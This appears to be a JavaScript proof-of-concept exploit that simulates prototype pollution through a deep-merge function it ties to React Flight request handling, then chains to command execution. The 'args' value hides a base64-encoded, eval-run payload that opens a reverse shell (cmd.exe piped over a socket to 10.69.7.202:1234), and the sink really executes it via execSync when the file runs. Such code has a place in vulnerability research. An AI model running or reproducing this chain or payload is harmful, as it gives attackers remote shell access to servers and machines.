// --- THE INFRASTRUCTURE (The "Invisible" Linking) ---

// In JS, we don't need "calling_given_gadget" because 
// the Prototype Chain links objects automatically.
const gadgetMap = {
    "LogGadget": (data) => console.log(`[LOG]: Processing ${data}`),
    "ConfigGadget": (obj) => {
            // This gadget looks for a "shell" property.
            // If polluted, it finds it on the prototype!
        const shell = obj.shell || "/bin/sh"; 
        console.log(`[CONFIG]: Using shell: ${shell}`);
        return shell;
    }
};

// --- THE VULNERABLE BACKEND (The Source & Sink) ---

// 1. THE SINK: A dangerous function that executes system commands
const execSink = (cmd) => {
    console.log(`\n!!! [SINK REACHED] !!!`);
    console.log(`[SHELL]: Executing -> ${cmd}`);

        // this shows nothing on the cmd, but it ran -> real attack
    // require('child_process').execSync(cmd)

    const { execSync } = require('child_process');
    const output = execSync(cmd);
    console.log(output.toString());
    
    
};

    // 2. THE VULNERABLE SOURCE: A "Recursive Merge" (common in Flight Protocol handlers)
function flightDeepMerge(target, source) {
    for (let key in source) {
        if (key === '__proto__') {
                // THE POLLUTION: Merging __proto__ affects ALL objects in the system
            Object.assign(Object.prototype, source[key]);
        } else if (typeof source[key] === 'object') {
            target[key] = target[key] || {};
            flightDeepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
















// --- THE ATTACK (The "Bombaclat" Moment) ---

function handleFlightRequest(incomingPayload) {
    let internalState = {};

    console.log("--- Step 1: Deserializing Flight Payload ---");
    flightDeepMerge(internalState, incomingPayload);

    console.log("--- Step 2: Triggering Gadget Chain ---");
        // GADGET 1: A legitimate call to a config utility
    const currentShell = gadgetMap["ConfigGadget"](internalState);
        // GADGET 2: A logic branch that uses the "shell" we just retrieved
    if (currentShell && internalState.execute) {
            // THE SINK
        execSink(`${currentShell} -e "${internalState.args}"`);
        // execSink(`${currentShell} -c "${internalState.args}"`);
    }
}

// --- THE MALICIOUS INPUT ---

const yourStupidReactFlightPayload = {
        // This looks like normal data, but 'proto' injects 'shell' into EVERY object
    "__proto__": {
        "shell": "node", 
        "execute": true 
    },
    "args": "eval(Buffer.from('Y29uc3QgbmV0PXJlcXVpcmUoJ25ldCcpLHtzcGF3bn09cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KDEyMzQsJzEwLjY5LjcuMjAyJywoKT0+e2NvbnN0IHM9c3Bhd24oJ2NtZC5leGUnLFtdLHtzaGVsbDp0cnVlfSk7Y2xpZW50LnBpcGUocy5zdGRpbik7cy5zdGRvdXQucGlwZShjbGllbnQpO3Muc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs=','base64').toString())" 
};

// Start the simulation
handleFlightRequest(yourStupidReactFlightPayload);